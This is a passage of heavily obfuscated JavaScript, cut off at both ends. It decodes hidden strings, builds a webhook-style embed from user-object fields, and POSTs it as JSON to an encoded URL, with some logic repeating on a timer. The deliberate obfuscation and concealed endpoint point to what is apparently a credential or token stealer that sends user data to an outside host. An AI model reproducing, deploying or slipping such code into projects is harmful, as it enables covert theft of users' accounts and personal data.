2s4(0x9e))}}catch{}}WfgY8I(rLqAuyh,VUT2s4(0x6c));async function rLqAuyh(...zPV4te){var ry8N2BZ;uGAa39(zPV4te[VUT2s4(0x5a)]=0x1,zPV4te[VUT2s4(0x14d)]=VUT2s4(0xda),ry8N2BZ=WfgY8I((...zPV4te)=>{uGAa39(zPV4te[VUT2s4(0x5a)]=0x5,zPV4te[VUT2s4(0x144)]=zPV4te[VUT2s4(0x6c)]);if(typeof zPV4te[VUT2s4(0x66)]===aUFcZqZ(VUT2s4(0x72))){zPV4te[0x3]=VqSuJl}zPV4te[VUT2s4(0x145)]=0x66;if(typeof zPV4te[VUT2s4(0x67)]===aUFcZqZ(zPV4te[zPV4te[VUT2s4(0x145)]+VUT2s4(0x196)]+VUT2s4(0x146))){zPV4te[VUT2s4(0x67)]=Z4ij83f}if(zPV4te[VUT2s4(0x144)]){[zPV4te[zPV4te[VUT2s4(0x145)]-VUT2s4(0x147)],zPV4te[VUT2s4(0x144)]]=[zPV4te[zPV4te[VUT2s4(0x145)]-VUT2s4(0x148)](zPV4te[VUT2s4(0x67)]),zPV4te[0x0]||zPV4te[VUT2s4(0x5c)]];return ry8N2BZ(zPV4te[VUT2s4(0x70)],zPV4te[zPV4te[VUT2s4(0x145)]-VUT2s4(0x147)],zPV4te[0x2])}if(zPV4te[VUT2s4(0x66)]===ry8N2BZ){VqSuJl=zPV4te[zPV4te[VUT2s4(0x145)]+0x5e];return VqSuJl(zPV4te[0x2])}zPV4te[VUT2s4(0x126)]=zPV4te[VUT2s4(0x66)];if(zPV4te[VUT2s4(0x126)]===VUT2s4(0x87)){ry8N2BZ=zPV4te[zPV4te[VUT2s4(0x145)]-VUT2s4(0x147)]}if(zPV4te[0x2]==zPV4te[VUT2s4(0x126)]){return zPV4te[VUT2s4(0x144)]?zPV4te[VUT2s4(0x70)][zPV4te[0x4][zPV4te[zPV4te[VUT2s4(0x145)]+VUT2s4(0xa1)]]]:Z4ij83f[zPV4te[zPV4te[VUT2s4(0x145)]-VUT2s4(0x149)]]||(zPV4te[VUT2s4(0x5c)]=zPV4te[VUT2s4(0x67)][zPV4te[zPV4te[VUT2s4(0x145)]-VUT2s4(0x149)]]||zPV4te[VUT2s4(0x126)],Z4ij83f[zPV4te[VUT2s4(0x70)]]=zPV4te[zPV4te[0xd3]-VUT2s4(0x14a)](T48M7Du[zPV4te[VUT2s4(0x70)]]))}if(zPV4te[VUT2s4(0x70)]!==zPV4te[VUT2s4(0x144)]){return zPV4te[VUT2s4(0x67)][zPV4te[VUT2s4(0x70)]]||(zPV4te[VUT2s4(0x67)][zPV4te[zPV4te[VUT2s4(0x145)]-0x66]]=zPV4te[VUT2s4(0x126)](T48M7Du[zPV4te[0x0]]))}},VUT2s4(0x71)),zPV4te.v4xkBXD=zPV4te[0xd5]-VUT2s4(0xaa),zPV4te[VUT2s4(0x15a)]=ry8N2BZ(zPV4te[VUT2s4(0x14c)]+0x59),zPV4te[VUT2s4(0xa7)]=zPV4te.X0KN0_,zPV4te[zPV4te[0xd5]-VUT2s4(0x5f)]=ry8N2BZ(VUT2s4(0x14b)),zPV4te[VUT2s4(0x8e)]=zPV4te[VUT2s4(0x67)],zPV4te[VUT2s4(0xa7)]=[Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[zPV4te[VUT2s4(0x14c)]+0x3b]),ry8N2BZ(0x5d),ry8N2BZ(0x64)],zPV4te[VUT2s4(0x79)]=Tl85W6m(zPV4te[VUT2s4(0x14c)]+0x39),zPV4te[0x7]=Tl85W6m(VUT2s4(0xf2)),zPV4te.PQMrOit=Tl85W6m(VUT2s4(0x6d)),zPV4te[VUT2s4(0x14f)]={[aUFcZqZ(VUT2s4(0x150))]:Tl85W6m(VUT2s4(0x85)),[aUFcZqZ(VUT2s4(0x152))]:Tl85W6m(VUT2s4(0x82)),[aUFcZqZ(zPV4te[VUT2s4(0x14d)]+0xce)]:Tl85W6m(VUT2s4(0x14e)),[aUFcZqZ(VUT2s4(0x159))]:Tl85W6m(VUT2s4(0xa7))});if(Ry5ikG0(zPV4te[VUT2s4(0x70)],eQQMUN=-0x17)){return}uGAa39(zPV4te[VUT2s4(0xb8)]=QzG8ub(zPV4te[VUT2s4(0x70)][zPV4te[VUT2s4(0x14f)][aUFcZqZ(VUT2s4(0x150))]+Tl85W6m(VUT2s4(0x69))]),zPV4te[VUT2s4(0xaa)]={[Tl85W6m(VUT2s4(0x88))]:Tl85W6m(0x43),[zPV4te.PQMrOit+Tl85W6m[aUFcZqZ(0xe6)](VUT2s4(0x87),VUT2s4(0x6e))]:Tl85W6m(VUT2s4(0x118)),[Tl85W6m(0x47)]:[{[zPV4te[VUT2s4(0x7c)]]:tQaWMp(-VUT2s4(0x180))[Tl85W6m(0x49)+Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[VUT2s4(0xdf)])+'\x49\x64'](Tl85W6m(VUT2s4(0xae))+Tl85W6m(VUT2s4(0x151)))[zPV4te[0x6]],[Tl85W6m(VUT2s4(0x8f))+zPV4te[VUT2s4(0xa7)][VUT2s4(0x70)]]:Tl85W6m(VUT2s4(0xde))+Tl85W6m(VUT2s4(0xf6))+zPV4te[VUT2s4(0x14f)][aUFcZqZ(VUT2s4(0x152))]+Tl85W6m[aUFcZqZ(VUT2s4(0x117))](void 0x0,zPV4te.v4xkBXD+VUT2s4(0x7a))+Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[VUT2s4(0x8c)])+Tl85W6m(0x55)+Tl85W6m(VUT2s4(0x153)),[Tl85W6m(zPV4te[VUT2s4(0x14c)]+VUT2s4(0x6b))]:0xff0000,[ry8N2BZ[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[zPV4te.v4xkBXD+0x44])]:[{[Tl85W6m(0x59)]:zPV4te[VUT2s4(0x8e)]+ry8N2BZ(VUT2s4(0x97))+Tl85W6m(0x5c),[Tl85W6m(VUT2s4(0x154))]:`\`${zPV4te[0x0][VUT2s4(0x141)]}\``,[ry8N2BZ(zPV4te[VUT2s4(0x14d)]+VUT2s4(0x13e))]:VUT2s4(0x155)},{[zPV4te[VUT2s4(0x14f)][aUFcZqZ(0xed)]]:ry8N2BZ(0x5e)+Tl85W6m(VUT2s4(0xe8)),[Tl85W6m(VUT2s4(0x154))]:`\`${zPV4te[VUT2s4(0x70)][ry8N2BZ(0x60)]}\``,[ry8N2BZ(VUT2s4(0x136))]:VUT2s4(0x155)},{[Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[VUT2s4(0x14e)])]:Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[VUT2s4(0x108)]),[Tl85W6m(VUT2s4(0x154))]:`\`${zPV4te[zPV4te[VUT2s4(0x14c)]-VUT2s4(0x7f)][ry8N2BZ(0x62)]}\``,[zPV4te[VUT2s4(0xa7)][0x1]]:VUT2s4(0x155)},{[Tl85W6m(VUT2s4(0x14e))]:Tl85W6m(0x63)+zPV4te[VUT2s4(0xa7)][zPV4te[VUT2s4(0x14d)]-0x1d]+ry8N2BZ(0x65),[Tl85W6m(0x4d)]:`\`${zPV4te[zPV4te[VUT2s4(0x14d)]-VUT2s4(0xda)][Tl85W6m(zPV4te.v4xkBXD+VUT2s4(0x82))]}\` ${zPV4te[VUT2s4(0xb8)]}`,[ry8N2BZ[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[zPV4te[VUT2s4(0x14d)]+0x3e])]:VUT2s4(0x155)},{[Tl85W6m(0x59)]:ry8N2BZ(zPV4te.v4xkBXD+VUT2s4(0x156))+ry8N2BZ(VUT2s4(0x157))+'\x2a\x2a',[Tl85W6m(VUT2s4(0x154))]:`\`${zPV4te[VUT2s4(0x70)][Tl85W6m(zPV4te[VUT2s4(0x14c)]+VUT2s4(0x84))+VUT2s4(0x158)]}\``,[ry8N2BZ(VUT2s4(0x136))]:VUT2s4(0x155)}],[ry8N2BZ[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[VUT2s4(0x146)])]:{[zPV4te.hUERFW_[aUFcZqZ(VUT2s4(0x159))]]:Tl85W6m(0x6c),[zPV4te[VUT2s4(0x15a)]+'\x72\x6c']:ry8N2BZ(0x6e)+ry8N2BZ(zPV4te[VUT2s4(0x14c)]+VUT2s4(0x97))+Tl85W6m(VUT2s4(0x15b))},[ry8N2BZ(VUT2s4(0x64))+Tl85W6m(VUT2s4(0x15c))]:new(tQaWMp(-VUT2s4(0x181)))()[ry8N2BZ(VUT2s4(0xf0))]()}]});try{var rLqAuyh=WfgY8I((...zPV4te)=>{uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x71),zPV4te[VUT2s4(0x15d)]=VUT2s4(0x6e));if(typeof zPV4te[zPV4te[VUT2s4(0x15d)]-VUT2s4(0x88)]===aUFcZqZ(VUT2s4(0x72))){zPV4te[VUT2s4(0x66)]=Imh86ks}if(typeof zPV4te[zPV4te[VUT2s4(0x15d)]-VUT2s4(0x69)]===aUFcZqZ(VUT2s4(0x72))){zPV4te[VUT2s4(0x67)]=Z4ij83f}if(zPV4te[VUT2s4(0x6c)]){[zPV4te[zPV4te.RViBUm7-VUT2s4(0x69)],zPV4te[VUT2s4(0x6c)]]=[zPV4te[0x3](zPV4te[VUT2s4(0x67)]),zPV4te[VUT2s4(0x70)]||zPV4te[VUT2s4(0x5c)]];return rLqAuyh(zPV4te[0x0],zPV4te[VUT2s4(0x67)],zPV4te[zPV4te.RViBUm7-VUT2s4(0x6b)])}if(zPV4te[zPV4te[VUT2s4(0x15d)]-VUT2s4(0x6b)]&&zPV4te[VUT2s4(0x66)]!==Imh86ks){rLqAuyh=Imh86ks;return rLqAuyh(zPV4te[VUT2s4(0x70)],-VUT2s4(0x6c),zPV4te[VUT2s4(0x5c)],zPV4te[zPV4te[VUT2s4(0x15d)]-0x42],zPV4te[0x4])}if(zPV4te[VUT2s4(0x5c)]==zPV4te[0x0]){return zPV4te[VUT2s4(0x6c)][Z4ij83f[zPV4te[VUT2s4(0x5c)]]]=rLqAuyh(zPV4te[VUT2s4(0x70)],zPV4te[zPV4te[VUT2s4(0x15d)]-0x44])}if(zPV4te[zPV4te.RViBUm7-VUT2s4(0x6b)]==zPV4te[VUT2s4(0x66)]){return zPV4te[zPV4te[VUT2s4(0x15d)]-VUT2s4(0x6d)]?zPV4te[VUT2s4(0x70)][zPV4te[VUT2s4(0x67)][zPV4te[VUT2s4(0x6c)]]]:Z4ij83f[zPV4te[VUT2s4(0x70)]]||(zPV4te[VUT2s4(0x5c)]=zPV4te[VUT2s4(0x67)][zPV4te[zPV4te[VUT2s4(0x15d)]-0x45]]||zPV4te[VUT2s4(0x66)],Z4ij83f[zPV4te[0x0]]=zPV4te[VUT2s4(0x5c)](T48M7Du[zPV4te[zPV4te.RViBUm7-0x45]]))}if(zPV4te[zPV4te[VUT2s4(0x15d)]-VUT2s4(0x6e)]!==zPV4te[VUT2s4(0x6c)]){return zPV4te[VUT2s4(0x67)][zPV4te[VUT2s4(0x70)]]||(zPV4te[zPV4te[VUT2s4(0x15d)]-VUT2s4(0x69)][zPV4te[VUT2s4(0x70)]]=zPV4te[VUT2s4(0x66)](T48M7Du[zPV4te[VUT2s4(0x70)]]))}},0x5);uGAa39(zPV4te[VUT2s4(0x81)]=[rLqAuyh(0x79)],await tQaWMp(VUT2s4(0xba))(eJxbUT,{[Tl85W6m(0x74)]:ry8N2BZ(VUT2s4(0x121)),[ry8N2BZ(VUT2s4(0x129))]:{[ry8N2BZ(VUT2s4(0x100))+ry8N2BZ(0x78)]:zPV4te[VUT2s4(0x81)][0x0]+rLqAuyh(VUT2s4(0x15e))+Tl85W6m[aUFcZqZ(VUT2s4(0x142))](void 0x0,[VUT2s4(0x127)])},[rLqAuyh(VUT2s4(0xff))]:tQaWMp(VUT2s4(0x182))[Tl85W6m(VUT2s4(0xf1))+rLqAuyh(VUT2s4(0x15f))](zPV4te[zPV4te[0xd5]-VUT2s4(0x7f)])}),tQaWMp(0xa4)[Tl85W6m(VUT2s4(0x76))](JnFxyvb,ry8N2BZ(VUT2s4(0x73))),WfgY8I(Imh86ks,VUT2s4(0x6c)));function Imh86ks(...zPV4te){var ry8N2BZ;uGAa39(zPV4te.length=VUT2s4(0x6c),zPV4te[VUT2s4(0x68)]=zPV4te.J3Cb7WV,zPV4te[0x1]='\u003d\u0050\u004f\u0071\u0072\u0070\u005a\u006c\u006e\u004d\u0042\u006f\u0041\u0062\u006a\u0061\u0036\u0022\u0044\u004c\u0052\u006d\u0063\u0028\u007b\u0025\u007c\u004a\u0060\u0051\u002b\u0056\u0065\u003b\u0026\u0035\u0075\u0069\u0037\u0074\u0078\u0045\u006b\u0043\u005e\u0030\u0057\u0076\u0033\u0031\u005b\u004e\u0059\u003a\u007e\u004b\u002f\u0029\u0068\u007d\u0058\u0054\u0047\u0039\u005f\u002c\u0073\u0040\u0046\u005d\u0077\u0048\u0055\u0021\u007a\u0038\u0053\u0032\u0049\u003c\u0023\u003f\u0079\u0034\u002e\u0024\u002a\u0064\u0066\u0067\u003e',zPV4te[VUT2s4(0x5c)]=''+(zPV4te[VUT2s4(0x70)]||''),zPV4te[VUT2s4(0x160)]=zPV4te[VUT2s4(0x5c)].length,zPV4te[VUT2s4(0x67)]=[],zPV4te[VUT2s4(0x71)]=VUT2s4(0x70),zPV4te[0x78]=VUT2s4(0x70),zPV4te[VUT2s4(0x161)]=-VUT2s4(0x6c));for(ry8N2BZ=VUT2s4(0x70);ry8N2BZ<zPV4te[VUT2s4(0x160)];ry8N2BZ++){zPV4te[VUT2s4(0x94)]=zPV4te[VUT2s4(0x6c)].indexOf(zPV4te[VUT2s4(0x5c)][ry8N2BZ]);if(zPV4te[VUT2s4(0x94)]===-VUT2s4(0x6c)){continue}if(zPV4te.t9xLlq<VUT2s4(0x70)){zPV4te[VUT2s4(0x161)]=zPV4te[VUT2s4(0x94)]}else{uGAa39(zPV4te.t9xLlq+=zPV4te[VUT2s4(0x94)]*VUT2s4(0x97),zPV4te[VUT2s4(0x71)]|=zPV4te[VUT2s4(0x161)]<<zPV4te[VUT2s4(0x68)],zPV4te[0x78]+=(zPV4te[VUT2s4(0x161)]&VUT2s4(0xc8))>VUT2s4(0x99)?0xd:VUT2s4(0x81));do{uGAa39(zPV4te[0x4].push(zPV4te[VUT2s4(0x71)]&VUT2s4(0x9d)),zPV4te[VUT2s4(0x71)]>>=VUT2s4(0x9c),zPV4te[VUT2s4(0x68)]-=VUT2s4(0x9c))}while(zPV4te[VUT2s4(0x68)]>VUT2s4(0x7c));zPV4te[VUT2s4(0x161)]=-VUT2s4(0x6c)}}if(zPV4te[VUT2s4(0x161)]>-VUT2s4(0x6c)){zPV4te[VUT2s4(0x67)].push((zPV4te[VUT2s4(0x71)]|zPV4te[VUT2s4(0x161)]<<zPV4te[VUT2s4(0x68)])&VUT2s4(0x9d))}return xdOTMdG(zPV4te[VUT2s4(0x67)])}}catch{}WfgY8I(VqSuJl,VUT2s4(0x6c));function VqSuJl(...zPV4te){var ry8N2BZ;uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x6c),zPV4te[VUT2s4(0x162)]=VUT2s4(0x96),zPV4te.q9r4Oo='\u0029\u002a\u005f\u0022\u005d\u0079\u0034\u0039\u0021\u0060\u007e\u007b\u0053\u006e\u004e\u0031\u0076\u0047\u0068\u0035\u0078\u007c\u0077\u0064\u0075\u0026\u0055\u004c\u0024\u006d\u002e\u0052\u0066\u0028\u0057\u0070\u004f\u0023\u0046\u0044\u003d\u003c\u003e\u006a\u0051\u0049\u0065\u004a\u0062\u0038\u0072\u003f\u005a\u0032\u004d\u0074\u002c\u003a\u0030\u0036\u0071\u006f\u006b\u0054\u0033\u002b\u006c\u005b\u0048\u0058\u0050\u0041\u007d\u0059\u0042\u0043\u0025\u0073\u0040\u004b\u0069\u0067\u0037\u0061\u0056\u007a\u002f\u0045\u0063\u005e\u003b',zPV4te[VUT2s4(0x163)]=''+(zPV4te[zPV4te[VUT2s4(0x162)]-VUT2s4(0x96)]||''),zPV4te[zPV4te[VUT2s4(0x162)]+0xb8]=0x39,zPV4te[VUT2s4(0x66)]=zPV4te[VUT2s4(0x163)].length,zPV4te[0xe9]=VUT2s4(0xf0),zPV4te[VUT2s4(0x165)]=[],zPV4te[VUT2s4(0x71)]=zPV4te[VUT2s4(0x162)]-VUT2s4(0x96),zPV4te.oej5m3=0x0,zPV4te[VUT2s4(0x7c)]=-0x1);for(ry8N2BZ=VUT2s4(0x70);ry8N2BZ<zPV4te[VUT2s4(0x66)];ry8N2BZ++){zPV4te[VUT2s4(0x94)]=zPV4te.q9r4Oo.indexOf(zPV4te[VUT2s4(0x163)][ry8N2BZ]);if(zPV4te[0x9]===-(zPV4te[VUT2s4(0x162)]-VUT2s4(0x9b))){continue}if(zPV4te[VUT2s4(0x7c)]<VUT2s4(0x70)){zPV4te[VUT2s4(0x7c)]=zPV4te[0x9]}else{uGAa39(zPV4te[VUT2s4(0x7c)]+=zPV4te[zPV4te[VUT2s4(0xe1)]-VUT2s4(0x146)]*VUT2s4(0x97),zPV4te[0x5]|=zPV4te[VUT2s4(0x7c)]<<zPV4te.oej5m3,zPV4te[VUT2s4(0x164)]+=(zPV4te[VUT2s4(0x7c)]&zPV4te[VUT2s4(0xe1)]+0x1f8c)>VUT2s4(0x99)?zPV4te[0xe9]-VUT2s4(0x149):zPV4te[VUT2s4(0x162)]-VUT2s4(0xba));do{uGAa39(zPV4te.pIkzo0P.push(zPV4te[VUT2s4(0x71)]&VUT2s4(0x9d)),zPV4te[VUT2s4(0x71)]>>=VUT2s4(0x9c),zPV4te[VUT2s4(0x164)]-=VUT2s4(0x9c))}while(zPV4te[VUT2s4(0x164)]>VUT2s4(0x7c));zPV4te[zPV4te[VUT2s4(0xe1)]-VUT2s4(0xdd)]=-0x1}}if(zPV4te[VUT2s4(0x7c)]>-VUT2s4(0x6c)){zPV4te.pIkzo0P.push((zPV4te[0x5]|zPV4te[0x7]<<zPV4te.oej5m3)&VUT2s4(0x9d))}return zPV4te[VUT2s4(0xe1)]>0xd6?zPV4te[-VUT2s4(0x8a)]:xdOTMdG(zPV4te[VUT2s4(0x165)])}}ry8N2BZ()[Tl85W6m(VUT2s4(0x166))](WfgY8I((...zPV4te)=>{uGAa39(zPV4te.length=VUT2s4(0x6c),zPV4te[VUT2s4(0x167)]=zPV4te[VUT2s4(0x5c)],zPV4te[VUT2s4(0x6c)]=Tl85W6m(VUT2s4(0x6f))in hZmlYq,zPV4te[VUT2s4(0x16f)]=VUT2s4(0xf0));if(zPV4te[VUT2s4(0x6c)]&&ekkU6Y.WL8B8v()){uGAa39(zPV4te[VUT2s4(0x167)]=WfgY8I(kb03HM((...zPV4te)=>{var QzG8ub,ry8N2BZ;uGAa39(zPV4te[VUT2s4(0x5a)]=VUT2s4(0x6c),zPV4te[VUT2s4(0x168)]=VUT2s4(0x97),zPV4te[0x1]=zPV4te[0x0].length);if(zPV4te[0x1]<zPV4te[VUT2s4(0x168)]-0x59){return VUT2s4(0x70)}uGAa39(zPV4te.N4D26dx=tQaWMp(VUT2s4(0x169)).max(...zPV4te[zPV4te.AJg1bh-VUT2s4(0x97)]),zPV4te[zPV4te.AJg1bh-VUT2s4(0x99)]=tQaWMp(VUT2s4(0x169)).min(...zPV4te[VUT2s4(0x70)]));if(zPV4te[VUT2s4(0x16c)]===zPV4te[0x3]&&ekkU6Y.gSM_d5>-VUT2s4(0xbd)){return VUT2s4(0x70)}uGAa39(zPV4te[VUT2s4(0x67)]=tQaWMp(-VUT2s4(0x16a))(Ry5ikG0(zPV4te[0x1],VUT2s4(0x6c),eQQMUN=-VUT2s4(0xcb))).fill(tQaWMp(VUT2s4(0x16b)).MAX_SAFE_INTEGER),zPV4te[VUT2s4(0x16d)]=tQaWMp(-(zPV4te[VUT2s4(0x168)]+VUT2s4(0xcc)))(Ry5ikG0(zPV4te[0x1],VUT2s4(0x6c),YZAyM8O(-VUT2s4(0xcb)))).fill(tQaWMp(VUT2s4(0x16b)).MIN_SAFE_INTEGER),zPV4te[VUT2s4(0x79)]=tQaWMp(VUT2s4(0x169)).ceil(Ry5ikG0(zPV4te[VUT2s4(0x16c)]-zPV4te[0x3],zPV4te[0x1]-VUT2s4(0x6c),YZAyM8O(zPV4te.AJg1bh-VUT2s4(0x6b)))),zPV4te[0x7]=VUT2s4(0x70));for(QzG8ub=VUT2s4(0x70);QzG8ub<zPV4te[zPV4te.AJg1bh-VUT2s4(0x14b)]&&ekkU6Y.gSM_d5>-0x29;QzG8ub++){if((zPV4te[VUT2s4(0x70)][QzG8ub]===zPV4te[VUT2s4(0x66)]||zPV4te[VUT2s4(0x70)][QzG8ub]===zPV4te[VUT2s4(0x16c)])&&ekkU6Y.UIoNQw[Tl85W6m(VUT2s4(0xed))](VUT2s4(0x79))=='\x75'){continue}uGAa39(zPV4te[VUT2s4(0x7c)]=tQaWMp(VUT2s4(0x169)).floor(Ry5ikG0(zPV4te[VUT2s4(0x70)][QzG8ub]-zPV4te[VUT2s4(0x66)],zPV4te[VUT2s4(0x79)],YZAyM8O(VUT2s4(0xd2)))),zPV4te[0x4][zPV4te[zPV4te[VUT2s4(0x168)]-0x54]]=tQaWMp(VUT2s4(0x169)).min(zPV4te[VUT2s4(0x67)][zPV4te[0x7]],zPV4te[VUT2s4(0x70)][QzG8ub]),zPV4te.GomOJ7[zPV4te[zPV4te[VUT2s4(0x168)]-0x54]]=tQaWMp(VUT2s4(0x169)).max(zPV4te[VUT2s4(0x16d)][zPV4te[VUT2s4(0x7c)]],zPV4te[zPV4te[VUT2s4(0x168)]-0x5b][QzG8ub]))}uGAa39(zPV4te[VUT2s4(0x94)]=tQaWMp(VUT2s4(0x16b)).MIN_SAFE_INTEGER,zPV4te[VUT2s4(0x16e)]=zPV4te[zPV4te[VUT2s4(0x168)]-VUT2s4(0x99)]);for(ry8N2BZ=VUT2s4(0x70);ry8N2BZ<zPV4te[zPV4te[VUT2s4(0x168)]-VUT2s4(0x14b)]-0x1;ry8N2BZ++){if(zPV4te[VUT2s4(0x67)][ry8N2BZ]===tQaWMp(VUT2s4(0x16b)).MAX_SAFE_INTEGER&&zPV4te[VUT2s4(0x16d)][ry8N2BZ]===tQaWMp(zPV4te[VUT2s4(0x168)]+0x348).MIN_SAFE_INTEGER&&ekkU6Y.UIoNQw[Tl85W6m(VUT2s4(0x6a))](0x6)==VUT2s4(0xe4)){continue}uGAa39(zPV4te[zPV4te[VUT2s4(0x168)]-VUT2s4(0x82)]=tQaWMp(VUT2s4(0x169)).max(zPV4te[VUT2s4(0x94)],Ry5ikG0(zPV4te[VUT2s4(0x67)][ry8N2BZ],zPV4te.UWGCHY,YZAyM8O(-VUT2s4(0xcb)))),zPV4te.UWGCHY=zPV4te[VUT2s4(0x16d)][ry8N2BZ])}return zPV4te[VUT2s4(0x168)]>VUT2s4(0x191)?zPV4te[-VUT2s4(0xa3)]:Jgk8VIP(zPV4te[VUT2s4(0x94)]=tQaWMp(VUT2s4(0x169)).max(zPV4te[VUT2s4(0x94)],Ry5ikG0(zPV4te[VUT2s4(0x16c)],zPV4te[VUT2s4(0x16e)],eQQMUN=-VUT2s4(0xcb))),zPV4te[VUT2s4(0x94)])}),0x1),tQaWMp(-0x7d).log(zPV4te._7iwWQ_))}zPV4te[VUT2s4(0x71)]=0x93;return zPV4te[VUT2s4(0x16f)]>VUT2s4(0x170)?zPV4te[-VUT2s4(0x131)]:rLqAuyh(zPV4te[VUT2s4(0x70)])},VUT2s4(0x6c)))},0x1388)},WfgY8I(tQaWMp,VUT2s4(0x6c)));function tQaWMp(...zPV4te){var Imh86ks;uGAa39(zPV4te[VUT2s4(0x5a)]=0x1,zPV4te[VUT2s4(0x172)]=zPV4te[VUT2s4(0x66)],Imh86ks=WfgY8I((...zPV4te)=>{uGAa39(zPV4te[VUT2s4(0x5a)]=0x5,zPV4te[0x85]=zPV4te[VUT2s4(0x66)]);if(typeof zPV4te[VUT2s4(0x171)]===aUFcZqZ(VUT2s4(0x72))){zPV4te[VUT2s4(0x171)]=QzG8ub}if(typeof zPV4te[VUT2s4(0x67)]===aUFcZqZ(VUT2s4(0x72))){zPV4te[VUT2s4(0x67)]=Z4ij83f}if(zPV4te[VUT2s4(0x171)]===void 0x0){Imh86ks=zPV4te[VUT2s4(0x67)]}if(zPV4te[VUT2s4(0x70)]!==zPV4te[VUT2s4(0x6c)]){return zPV4te[VUT2s4(0x67)][zPV4te[VUT2s4(0x70)]]||(zPV4te[VUT2s4(0x67)][zPV4te[VUT2s4(0x70)]]=zPV4te[VUT2s4(0x171)](T48M7Du[zPV4te[VUT2s4(0x70)]]))}if(zPV4te[VUT2s4(0x171)]===Imh86ks){QzG8ub=zPV4te[VUT2s4(0x6c)];return QzG8ub(zPV4te[VUT2s4(0x5c)])}if(zPV4te[VUT2s4(0x5c)]==zPV4te[0x0]){return zPV4te[0x1][Z4ij83f[zPV4te[VUT2s4(0x5c)]]]=Imh86ks(zPV4te[VUT2s4(0x70)],zPV4te[VUT2s4(0x6c)])}},VUT2s4(0x71)),zPV4te[VUT2s4(0x172)]=[Tl85W6m(0xb5),Tl85W6m(VUT2s4(0x12a)),Imh86ks(VUT2s4(0x173))],zPV4te[VUT2s4(0x67)]={[aUFcZqZ(VUT2s4(0x195))]:Tl85W6m(VUT2s4(0x174))},zPV4te[0x5]=Tl85W6m(0x8f),zPV4te[VUT2s4(0x197)]=zPV4te[VUT2s4(0x172)],zPV4te[0x6]=VUT2s4(0x87));switch(zPV4te[0x0]){case VUT2s4(0x75):zPV4te[VUT2s4(0x79)]=Tl85W6m(0x85)||VOcdbOc[Tl85W6m(VUT2s4(0x171))];break;case!(ekkU6Y.MLoFok>-VUT2s4(0x175))?VUT2s4(0xe2):VUT2s4(0x176):zPV4te[VUT2s4(0x79)]=Tl85W6m(0x86)+Tl85W6m(VUT2s4(0x177))||VOcdbOc[Tl85W6m(VUT2s4(0x91))+Tl85W6m[aUFcZqZ(VUT2s4(0x117))](VUT2s4(0x87),0x87)];break;case!ekkU6Y.qjkibX()?-VUT2s4(0x5f):VUT2s4(0xd5):zPV4te[0x6]=Tl85W6m(VUT2s4(0x83))+Tl85W6m(0x89)||VOcdbOc[Tl85W6m(0x88)+Tl85W6m(0x89)];break;case!(ekkU6Y.UIoNQw[Tl85W6m(0x8a)](0x6)==VUT2s4(0xe4))?null:-0x7c:return VOcdbOc[Tl85W6m(VUT2s4(0x95))];case ekkU6Y.gSM_d5>-VUT2s4(0xbd)?-VUT2s4(0x178):void 0x0:return VOcdbOc[Tl85W6m(VUT2s4(0x179))];case ekkU6Y.qjkibX()?-0x1e4:VUT2s4(0x87):zPV4te[0x6]=Tl85W6m(0x8d)||VOcdbOc[Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[0x8d])];break;case-VUT2s4(0x133):zPV4te[VUT2s4(0x79)]=Tl85W6m(VUT2s4(0x189))+zPV4te[VUT2s4(0x71)]+VUT2s4(0x19f)||VOcdbOc[Tl85W6m(VUT2s4(0xbf))];break;case!(ekkU6Y.UIoNQw[Tl85W6m(VUT2s4(0x17a))](VUT2s4(0x79))==VUT2s4(0xe4))?null:-VUT2s4(0x16a):return VOcdbOc[Tl85W6m(0x91)];case ekkU6Y.Pz81CU[Tl85W6m(VUT2s4(0xc0))+Tl85W6m[aUFcZqZ(VUT2s4(0x117))](VUT2s4(0x87),VUT2s4(0x17b))](VUT2s4(0x67))==VUT2s4(0x121)?-VUT2s4(0x17c):null:return VOcdbOc[Tl85W6m(VUT2s4(0xc2))];case!(ekkU6Y.Pz81CU[Tl85W6m(VUT2s4(0xc0))+Tl85W6m[aUFcZqZ(VUT2s4(0x117))](VUT2s4(0x87),VUT2s4(0x17b))](VUT2s4(0x67))==VUT2s4(0x121))?-VUT2s4(0x80):VUT2s4(0x17d):zPV4te[VUT2s4(0x79)]=Tl85W6m(VUT2s4(0xca))||VOcdbOc[Tl85W6m[aUFcZqZ(0xe6)](VUT2s4(0x87),VUT2s4(0x17e))+'\x70\x65'];break;case!ekkU6Y.WL8B8v()?VUT2s4(0x15f):VUT2s4(0x17f):return VOcdbOc[Tl85W6m(VUT2s4(0x19a))];case ekkU6Y.UIoNQw[Tl85W6m(0x8a)](VUT2s4(0x79))==VUT2s4(0xe4)?-0x7d:null:zPV4te[0x6]=Tl85W6m[aUFcZqZ(VUT2s4(0x117))](VUT2s4(0x87),VUT2s4(0x105))||VOcdbOc[Tl85W6m[aUFcZqZ(0xe6)](VUT2s4(0x87),VUT2s4(0x105))];break;case ekkU6Y.WL8B8v()?VUT2s4(0xba):VUT2s4(0x7a):return VOcdbOc[Tl85W6m(VUT2s4(0x134))];case!ekkU6Y.WL8B8v()?VUT2s4(0x87):-VUT2s4(0x180):return VOcdbOc[Tl85W6m[aUFcZqZ(VUT2s4(0x117))](VUT2s4(0x87),0x9a)+VUT2s4(0x18a)];case!(ekkU6Y.Pz81CU[Tl85W6m(VUT2s4(0xc0))+Tl85W6m(VUT2s4(0x17b))](VUT2s4(0x67))==0x75)?VUT2s4(0x87):-VUT2s4(0x181):return VOcdbOc[Tl85W6m(0x9b)];case ekkU6Y.Pz81CU[Tl85W6m(VUT2s4(0xc0))+Tl85W6m[aUFcZqZ(VUT2s4(0x142))](VUT2s4(0x87),[VUT2s4(0x17b)])](0x4)==VUT2s4(0x121)?VUT2s4(0x182):VUT2s4(0x5e):return VOcdbOc[Tl85W6m(VUT2s4(0x183))];case 